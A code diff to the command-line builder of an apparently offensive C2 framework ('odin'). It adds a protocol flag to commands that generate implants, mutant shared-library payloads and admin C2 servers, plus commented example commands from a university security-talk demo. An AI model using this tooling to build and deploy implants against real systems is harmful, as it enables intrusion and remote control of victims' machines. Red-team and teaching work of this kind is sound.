@@ -6,9 +6,9 @@ import (
   "time"
   "io/ioutil"
 
-  "odin/lib/c2"
-  "odin/builder"
-  "odin/lib/utils"
+  "github.com/alphamystic/odin/lib/c2"
+  "github.com/alphamystic/odin/builder"
+  "github.com/alphamystic/odin/lib/utils"
   "github.com/spf13/cobra"
 )
 
@@ -29,9 +29,26 @@ var cmdImplantGenerate = &cobra.Command{
     architecture,_ := cmd.Flags().GetString("arch")
     msid,_ := cmd.Flags().GetString("msid")
     entry,_ := cmd.Flags().GetString("entry")
+    prtl,_ := cmd.Flags().GetString("prtcl")
     //generate a binary file
+    if utils.CheckifStringIsEmpty(prtl){
+      sesn := RunningSessions.NewSession(name,msid, StartTime.AddDate(1,0,0).String(),SessionsDriver)
+      bob,err := builder.CreateBuilder(architecture,ops,format,"basic",name,entry,prtl,true)
+      if err != nil {
+        utils.Logerror(err)
+        return
+      }
+      ma := c2.CreateMinion(msid,name,msAddress,lhost,utils.StringToInt(lport),sesn,false)
+      var g builder.Generator
+      g = &builder.MinionGenerate{ ma,bob }
+      err = g.Generate()
+      if err!= nil {
+        utils.Logerror(err);return
+      }
+      return
+    }
     sesn := RunningSessions.NewSession(name,msid, StartTime.AddDate(1,0,0).String(),SessionsDriver)
-    bob,err := builder.CreateBuilder(architecture,ops,format,"basic",name,entry,true)
+    bob,err := builder.CreateBuilder(architecture,ops,format,"basic",name,entry,prtl,true)
     if err != nil {
       utils.Logerror(err)
       return
@@ -47,6 +64,10 @@ var cmdImplantGenerate = &cobra.Command{
 }
 /*
   LINUX archs arm,arm64,386,amd64
+  // Intervarsity co demo
+  generate --prtcl http --name usiu_implant2 --f elf --ops lin --lhost 127.0.0.1 --lport 45565  --arch x64  --msid d188277b32a74d95f315172f7b03c7ad
+  // end of iv demo
+
   generate --name test_ --f elf --ops lin --lhost 127.0.0.1 --lport 44566  --arch x64  --msid 39bfc799c4a77b5d0e55c16c59b75f9e
   generate-mutant --name mutant --f so --ops lin --lhost 127.0.0.1 --lport 44566  --arch x64  --msid fa81cec958b46740479ea2b275125fc4
 
@@ -100,6 +121,7 @@ var cmdAdminGenerate = &cobra.Command{
     tls,_ := cmd.Flags().GetBool("bool")
     keyCrtFile,_ := cmd.Flags().GetString("keyCrtFile")
     certFile,_ := cmd.Flags().GetString("certFile")
+    prtl,_ := cmd.Flags().GetString("prtcl")
     if pass == ""|| len(pass) < 0{
       utils.Logerror(fmt.Errorf("password cannot be empty"))
       return
@@ -114,8 +136,27 @@ var cmdAdminGenerate = &cobra.Command{
       if err != nil{
         utils.Logerror(err);return
       }
+      /// check if the protocol is set and work with that
+      if utils.CheckifStringIsEmpty(prtl){
+        adminC2 :=  c2.CreateAdminC2(hash,name,utils.Md5Hash(utils.RandString(10)),address,prtl,prtl,cert,keyCrt,utils.StringToInt(oPort),utils.StringToInt(oPort),true)
+        bob,err := builder.CreateBuilder(arch,osType,format,"basic",name,entry,prtl,false)
+        if err != nil {
+          utils.Logerror(err)
+          return
+        }
+        var g builder.Generator
+        g = &builder.MSGenerate {adminC2,bob}
+        err = g.Generate()
+        if err != nil {
+          utils.Logerror(err)
+          return
+        }
+        //add to connectors with nil values
+        _ = Conns.NewConnector(adminC2.MSId,address+":"+oPort,address+":"+oPort,name,ConnectorsDriver)
+        return
+      }
       adminC2 :=  c2.CreateAdminC2(hash,name,utils.Md5Hash(utils.RandString(10)),address,iProtocol,oProtocol,cert,keyCrt,utils.StringToInt(iPort),utils.StringToInt(oPort),true)
-      bob,err := builder.CreateBuilder(arch,osType,format,"basic",name,entry,false)
+      bob,err := builder.CreateBuilder(arch,osType,format,"basic",name,entry,prtl,false)
       if err != nil {
         utils.Logerror(err)
         return
@@ -129,9 +170,28 @@ var cmdAdminGenerate = &cobra.Command{
       }
       //add to connectors with nil values
       _ = Conns.NewConnector(adminC2.MSId,address+":"+iPort,address+":"+oPort,name,ConnectorsDriver)
+      return
     } else {
+      if utils.CheckifStringIsEmpty(prtl){
+        adminC2 :=  c2.CreateAdminC2(hash,name,utils.Md5Hash(utils.RandString(10)),address,prtl,prtl,"","",utils.StringToInt(oPort),utils.StringToInt(oPort),true)
+        bob,err := builder.CreateBuilder(arch,osType,format,"basic",name,entry,prtl,false)
+        if err != nil {
+          utils.Logerror(err)
+          return
+        }
+        var g builder.Generator
+        g = &builder.MSGenerate {adminC2,bob}
+        err = g.Generate()
+        if err != nil {
+          utils.Logerror(err)
+          return
+        }
+        //add to connectors with nil values
+        _ = Conns.NewConnector(adminC2.MSId,address+":"+oPort,address+":"+oPort,name,ConnectorsDriver)
+        return
+      }
       adminC2 :=  c2.CreateAdminC2(hash,name,utils.Md5Hash(utils.RandString(10)),address,iProtocol,oProtocol,"","",utils.StringToInt(iPort),utils.StringToInt(oPort),false)
-      bob,err := builder.CreateBuilder(arch,osType,format,"basic",name,entry,false)
+      bob,err := builder.CreateBuilder(arch,osType,format,"basic",name,entry,prtl,false)
       if err != nil {
         utils.Logerror(err)
         return
@@ -150,6 +210,9 @@ var cmdAdminGenerate = &cobra.Command{
 }
 /*
   Linux Admins archs arm,arm64,386,amd64
+  // USIU_SHEHACK_TALK
+  gen-admin --prtcl http --oport 45565  --arch x64 --os lin --f elf --addr 0.0.0.0 --pass Qwerty --name try_usiu1
+  // EMD
   gen-admin --iprotocol tcp --oprotocol tcp --oport 45565  --iport  44566 --arch x64 --os lin --f elf --addr 0.0.0.0 --pass Qwerty --name try
   gen-admin --name groot --iprotocol tcp --oprotocol tcp --oport 45567  --iport  44568 --arch x64 --os lin --f so --addr 0.0.0.0 --pass Qwerty
   SHELLCODE(Unsurported for now) Just use hunter and spike your arrows
@@ -185,9 +248,10 @@ var cmdGenerateMutant = &cobra.Command{
     architecture,_ := cmd.Flags().GetString("arch")
     msid,_ := cmd.Flags().GetString("msid")
     entry,_ := cmd.Flags().GetString("entry")
+    prtl,_ := cmd.Flags().GetString("prtcl")
     //generate a binary file
     sesn := RunningSessions.NewSession(name+"_mutant",msid + "mutant", StartTime.AddDate(10,0,0).String(),SessionsDriver)
-    bob,err := builder.CreateBuilder(architecture,ops,format,"basic",name,entry,true)
+    bob,err := builder.CreateBuilder(architecture,ops,format,"basic",name,entry,prtl,true)
     if err != nil {
       utils.Logerror(err)
       return
@@ -313,6 +377,7 @@ func init(){
   cmdGenerateMutant.Flags().String("arch","x32","Architecture of the target operating system")
   cmdGenerateMutant.Flags().String("msid","dfghu654e","ID of the mothership")
   cmdGenerateMutant.Flags().String("entry","MYENTRYPOINT","Entry point for your .dll or .so or exported function for shared libraries")
+  cmdGenerateMutant.Flags().String("prtcl","http","Protocol to use for communication.")
   // implant flags
   cmdImplantGenerate.Flags().String("name","kimJonYon","Name of implant/shellcode")
   cmdImplantGenerate.Flags().String("f","exe","Frmat for payload/implant")
@@ -323,6 +388,7 @@ func init(){
   cmdImplantGenerate.Flags().String("arch","x32","Architecture of the target operating system")
   cmdImplantGenerate.Flags().String("msid","dfghu654e","ID of the mothership")
   cmdImplantGenerate.Flags().String("entry","MYENTRYPOINT","Entry point for your .dll or .so or exported function for shared libraries")
+  cmdImplantGenerate.Flags().String("prtcl","http","Protocol to use for communication.")
   // admin flags
   cmdAdminGenerate.Flags().String("addr","127.0.0.1","Address for the C2 to bind into (0.0.0.0)")
   cmdAdminGenerate.Flags().String("iprotocol","http","Protocol the implants are running.")
@@ -338,6 +404,7 @@ func init(){
   cmdAdminGenerate.Flags().Bool("tls",false,"Set to true and specify key and certfile")
   cmdAdminGenerate.Flags().String("keyCrtFile","../bin/certs/key.pem","key file for the server to be used")
   cmdAdminGenerate.Flags().String("certFile","../bin/certs/cert.pem","Server cert file to be used")
+  cmdAdminGenerate.Flags().String("prtcl","http","Protocol to use for communication.")
   //cmdAdminGenerate.Flags().Bool("active",true,"Run admin immediatly or wait for a starter.")
   //Hunter flags
   cmdHunter.Flags().String("f","iso","Format for poncupine to implement.")
